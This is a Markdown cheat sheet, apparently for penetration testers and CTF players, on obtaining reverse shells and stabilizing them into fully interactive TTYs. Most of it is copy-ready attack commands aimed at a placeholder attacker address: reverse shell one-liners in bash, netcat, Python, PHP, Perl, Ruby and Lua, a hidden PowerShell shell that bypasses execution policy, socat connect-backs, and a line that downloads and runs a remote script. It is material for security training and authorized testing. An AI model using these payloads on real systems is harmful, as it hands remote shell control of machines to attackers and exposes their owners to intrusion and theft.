# Reverse Shell & TTY Stabilization Cheat Sheet

> A comprehensive cheat sheet for spawning TTY shells and stabilizing reverse shells during penetration testing and CTF challenges.

---

## Table of Contents

- [What is TTY?](#what-is-tty)
- [Why Stabilize Your Shell?](#why-stabilize-your-shell)
- [Listeners](#listeners)
- [Basic Reverse Shells](#basic-reverse-shells)
  - [Bash](#bash)
  - [Netcat](#netcat)
  - [Python](#python)
  - [PHP](#php)
  - [Perl](#perl)
  - [Ruby](#ruby)
  - [Lua](#lua)
  - [PowerShell](#powershell)
- [TTY Shell Spawning](#tty-shell-spawning)
  - [PTY Allocation](#pty-allocation)
  - [Shell Spawners Without a PTY](#shell-spawners-without-a-pty)
- [Full TTY Stabilization](#full-tty-stabilization)
- [Alternative Methods](#alternative-methods)
  - [socat](#socat)
  - [rlwrap](#rlwrap)
  - [pwncat-cs](#pwncat-cs)
  - [Penelope](#penelope)
  - [ConPtyShell (Windows)](#conptyshell-windows)
- [Tips & Troubleshooting](#tips--troubleshooting)
- [Quick Reference](#quick-reference)
- [Disclaimer](#disclaimer)
- [Resources](#resources)

---

## What is TTY?

**TTY** (Teletypewriter) is a terminal interface that allows interactive communication with the operating system. A basic reverse shell is often just a pipe to a shell process, without TTY features such as:

- Command history and line editing (arrow keys)
- Tab completion
- Clear screen (`Ctrl + L`)
- Text editors and pagers (vim, nano, less)
- Proper signal handling (`Ctrl + C` interrupts instead of killing the shell)
- Job control (`Ctrl + Z`, `fg`, `bg`)
- Terminal resizing and correct output formatting

Stabilizing your shell gives you a fully interactive TTY session.

---

## Why Stabilize Your Shell?

| Problem | After Stabilization |
|---------|---------------------|
| `Ctrl + C` may kill the shell | `Ctrl + C` interrupts the current command |
| No command history | Up/down arrow keys work |
| No tab completion | Tab completion works |
| Password prompts may not display correctly | Interactive programs (sudo, ssh, su) work |
| Cannot use text editors | vim, nano, less work properly |
| Terminal resize issues | Terminal size can be set correctly |

---

## Listeners

Start a listener **before** triggering the payload on the target.

```bash
# Basic listener (Linux netcat)
nc -lvnp <PORT>

# Listener with history and line editing (not a full TTY)
rlwrap -cAr nc -lvnp <PORT>
```

> **Netcat variants:** `nc -lvnp` is common on Linux, but OpenBSD/macOS netcat uses `nc -l <PORT>`, and some builds require `nc -l -p <PORT>`. The `-e` option is disabled in many modern builds; use `ncat`, `nc.traditional`, or the FIFO method below instead.

---

## Basic Reverse Shells

> Replace `<ATTACKER_IP>` and `<PORT>` with your listener address. Use `/bin/sh` instead of `/bin/bash` when bash is not installed. The exact payload depends on the target OS, available interpreters, and the injection context.

### Bash

Requires bash compiled with `/dev/tcp` support.

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

If the command is executed through `sh`/`dash` (common in web command injection), the outer shell will try to parse the `/dev/tcp` redirection and fail with `Bad fd number`. Wrap the payload in bash so bash parses it:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
```

If `bash` is not in `PATH`, use the absolute path:

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
```

### Netcat

**Traditional netcat (with `-e`):**

```bash
nc -e /bin/bash <ATTACKER_IP> <PORT>
nc -e /bin/sh <ATTACKER_IP> <PORT>
```

**Ncat:**

```bash
ncat <ATTACKER_IP> <PORT> -e /bin/bash
```

**OpenBSD/BusyBox netcat (without `-e`) — FIFO method:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Python 2:**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### PHP

Requires `proc_open()` to be enabled:

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

Fallback with `exec()` (assumes the socket is file descriptor 3, which is typical but not guaranteed):

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<ATTACKER_IP>",<PORT>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### Lua

Requires [LuaSocket](https://github.com/lunarmodules/luasocket) and a Unix-like target:

```bash
lua -e "local s=require('socket').tcp();s:connect('<ATTACKER_IP>',<PORT>);local fd=s:getfd();os.execute(string.format('/bin/bash -i <&%d >&%d 2>&%d',fd,fd,fd))"
```

> `getfd()` is a LuaSocket internal API and is not portable (for example, it is not available on Windows). The `os.execute` redirection relies on Unix file descriptor inheritance.

### PowerShell

Windows reverse shell. Run this from `cmd.exe`; if you are already in PowerShell, run the inner commands directly instead of nesting them inside `powershell -Command "..."`, or PowerShell will expand the `$` variables before the payload runs:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

For a fully interactive Windows TTY, see [ConPtyShell](#conptyshell-windows).

---

## TTY Shell Spawning

Use these when you already have command execution but no TTY. Replace `/bin/bash` with `/bin/sh` if bash is unavailable.

### PTY Allocation

These commands actually allocate a pseudo-terminal, so `tty` should report `/dev/pts/N` afterward:

| Method | Command |
|--------|---------|
| **Python** | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| **Python3** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| **Script** | `/usr/bin/script -qc /bin/bash /dev/null` |
| **Expect** | `/usr/bin/expect -c 'spawn /bin/bash; interact'` |

> The `script` command above uses util-linux syntax (common on Linux). `script -qc ...` spawns a PTY directly and can replace the Python `pty.spawn` step.

### Shell Spawners Without a PTY

These methods spawn a new shell but **do not allocate a PTY**. They are useful in restricted shells or when common interpreters are missing. Follow them with a PTY allocation method if you need a full TTY:

| Method | Command |
|--------|---------|
| **Perl** | `perl -e 'exec "/bin/sh";'` |
| **Ruby** | `ruby -e 'exec "/bin/sh"'` |
| **Lua** | `lua -e 'os.execute("/bin/sh")'` |
| **AWK** | `awk 'BEGIN {system("/bin/sh")}'` |
| **Find** | `find . -exec /bin/sh \; -quit` |
| **Env** | `env /bin/sh` |
| **Vi** | `vi -c ':!/bin/sh' /dev/null` |
| **Direct** | `/bin/sh -i` |

> AWK/FIND/ENV/VI methods depend on the specific binary and its features. VI in particular usually needs a working terminal to run.

---

## Full TTY Stabilization

This is the **recommended method** for a fully interactive Linux TTY shell. It assumes your listener is a plain `nc` process in your current terminal.

### Step 0: Get Your Local Terminal Size

Run this on the **attacker machine**, before putting the terminal in raw mode (or use a second terminal):

```bash
stty size
```

Example output: `34 132` — the order is **rows columns**, not columns rows.

### Step 1: Spawn a TTY on the Victim

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Or, if Python is unavailable:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Step 2: Background the Local Listener

Press **`Ctrl + Z`** in the terminal that is running `nc`.

> This suspends the **local listener**, not the remote shell. The remote PTY keeps running while the listener is suspended locally.

### Step 3: Put Your Local Terminal in Raw Mode and Resume

On the **attacker machine**:

```bash
stty raw -echo; fg
```

Then press **`Enter`** twice to get the remote prompt back.

### Step 4: Configure the Victim Shell

Once you have the prompt back, run the following on the **victim**:

```bash
export TERM=xterm-256color
reset
export SHELL=/bin/bash
stty rows <ROWS> cols <COLS>
```

Use the values from `stty size` in Step 0. If `xterm-256color` terminfo is missing on the target, use `export TERM=xterm` instead. If the target does not have the `reset` command, skip that line and set `TERM` and the terminal size manually.

### Step 5: Verify the TTY

On the victim:

```bash
tty
# Should print /dev/pts/N, not "not a tty"

echo $TERM
stty size
```

If `tty` reports `not a tty`, the PTY was not spawned successfully. Retry the spawn command, or use another PTY allocation method from the table above.

### Summary (Quick Steps)

```text
[Attacker]
$ stty size                  # note ROWS and COLS
$ nc -lvnp <PORT>

[Victim]
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

[Attacker]
Ctrl + Z                     # suspend the local listener
$ stty raw -echo; fg
[Enter] [Enter]

[Victim]
$ export TERM=xterm-256color
$ reset
$ export SHELL=/bin/bash
$ stty rows <ROWS> cols <COLS>
```

---

## Alternative Methods

### socat

`socat` handles the raw mode and PTY allocation for you, avoiding the `Ctrl + Z` / `stty` dance.

**Attacker (listener):**

```bash
socat file:$(tty),raw,echo=0 tcp-listen:<PORT>
```

**Victim (connect back):**

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:<PORT>
```

### rlwrap

`rlwrap` adds history and line editing to a plain netcat session, but it does **not** provide a full TTY:

```bash
rlwrap -cAr nc -lvnp <PORT>
```

> The manual `stty raw -echo; fg` workflow in [Full TTY Stabilization](#full-tty-stabilization) assumes a plain `nc` listener. `rlwrap` manages terminal input itself and may interfere with raw mode.

### pwncat-cs

[pwncat-cs](https://github.com/calebstewart/pwncat) is a post-exploitation platform that automatically attempts to spawn a PTY, normalizes the shell, and keeps local/remote terminal settings in sync.

```bash
pipx install pwncat-cs
pwncat-cs -lp <PORT>
```

### Penelope

[Penelope](https://github.com/brightio/penelope) is a shell handler that automatically upgrades Unix-like shells to a PTY, logs sessions, and supports multiple listeners and sessions.

```bash
# Kali Linux
sudo apt install penelope

# Or install from PyPI
pipx install penelope-shell-handler

penelope -p <PORT>
```

Press **`F12`** to detach from a PTY session and return to the Penelope menu.

### ConPtyShell (Windows)

[ConPtyShell](https://github.com/antonioCoco/ConPtyShell) provides a fully interactive reverse shell on Windows 10 / Windows Server 2019 (build 17763) and newer.

**Attacker (listener):**

```bash
stty raw -echo; (stty size; cat) | nc -lvnp <PORT>
```

**Victim (PowerShell):**

```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ATTACKER_IP> <PORT>
```

If the target does not support ConPTY, the shell falls back to a normal netcat-like interactive shell.

---

## Tips & Troubleshooting

### Checking Whether You Have a TTY

```bash
tty
```

- `/dev/pts/N` — you have a PTY.
- `not a tty` — you do not have a PTY; spawn one first.

### Finding and Setting Terminal Size

On the attacker terminal:

```bash
stty size
```

Example output: `34 132` (rows columns).

On the victim:

```bash
stty rows 34 cols 132
```

### Fixing Arrow Keys and Colors

If arrow keys print escape sequences such as `^[[A`, either you are not in a PTY, the `TERM` value is wrong, or its terminfo entry is missing:

```bash
export TERM=xterm-256color
```

If the target does not have that terminfo entry, fall back to `xterm`.

### Common TERM Values

| Value | Description |
|-------|-------------|
| `xterm` | Basic xterm; common fallback |
| `xterm-256color` | xterm with 256-color support |
| `screen` | GNU Screen |
| `screen-256color` | GNU Screen with 256 colors |
| `tmux` | tmux |
| `tmux-256color` | tmux with 256 colors |
| `vt100` | Minimal VT100 terminal |
| `linux` | Linux console |

### Resetting Your Local Terminal

If your local terminal gets garbled after a failed stabilization (for example, no echo or broken line wrapping):

```bash
reset
```

Or, if `reset` is unavailable:

```bash
stty sane
```

You may need to run these in a **new** local terminal if the current one is unusable.

### Background Job Issues

If `Ctrl + Z` does not suspend the listener, or `fg` does not resume it, check local jobs:

```bash
jobs
fg %1
```

Job control must be enabled in your local shell. If it is not available (for example, inside some scripts or restricted environments), use `socat` or run the listener in a separate terminal or tmux window.

### What if Python is Not Available?

Check which interpreters and utilities exist on the target:

```bash
which python3 python perl ruby lua php awk find expect script socat busybox

# If `which` is unavailable (portable loop):
for b in python3 python perl ruby lua php awk find expect script socat busybox; do
  command -v "$b" 2>/dev/null
done
```

Use any available method from the [TTY Shell Spawning](#tty-shell-spawning) table.

### Netcat `-e` Is Disabled

Many modern netcat builds (OpenBSD netcat, BusyBox) do not support `-e`. Options:

- Use `ncat`.
- Use `nc.traditional`.
- Use the FIFO method:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

### Avoiding Common Mistakes

- ❌ Don't press `Ctrl + C` in an unstabilized shell — it may kill the shell or the connection.
- ❌ Don't run `stty raw -echo` in the wrong terminal — run it in the terminal that is running the listener.
- ✅ Spawn a PTY before running interactive programs.
- ✅ Set `TERM` to enable colors and correct rendering.
- ✅ Match the remote terminal size to your local terminal size.
- ✅ Run `reset` or `stty sane` locally if your terminal gets garbled.
- ✅ Remember that reverse shell traffic is usually **unencrypted**; use a VPN or SSH tunnel on untrusted networks.
- ✅ Only test systems you own or have explicit written permission to test.

---

## Quick Reference

| Step | Action | Command / Key |
|------|--------|---------------|
| 1 | Start a listener | `nc -lvnp <PORT>` |
| 2 | Trigger a payload | See [Basic Reverse Shells](#basic-reverse-shells) |
| 3 | Spawn a PTY | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| 4 | Background the local listener | `Ctrl + Z` |
| 5 | Enter raw mode and resume | `stty raw -echo; fg`, then `Enter` twice |
| 6 | Set terminal type and fix display | `export TERM=xterm-256color; reset` |
| 7 | Match terminal size | `stty rows <ROWS> cols <COLS>` |
| 8 | Verify | `tty` should print `/dev/pts/N` |

> Steps 4–7 are for a plain `nc` listener. If you use a listener/payload that handles PTY allocation and terminal setup automatically (for example `socat` with the victim-side `socat exec:...pty...` command, `pwncat-cs`, or Penelope), use the workflow in [Alternative Methods](#alternative-methods) instead.

---

## Disclaimer

This cheat sheet is intended for **authorized penetration testing**, **CTF competitions**, and **educational purposes** only. Always ensure you have explicit permission before testing systems you do not own.

---

## Resources

- [Internal All The Things — Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
- [HackTricks — Full TTY](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/full-tty.html)
- [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [GTFOBins](https://gtfobins.github.io/)
- [RevShells — Reverse Shell Generator](https://www.revshells.com/)
- [pwncat-cs](https://github.com/calebstewart/pwncat)
- [Penelope](https://github.com/brightio/penelope)
- [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
- [LuaSocket](https://github.com/lunarmodules/luasocket)
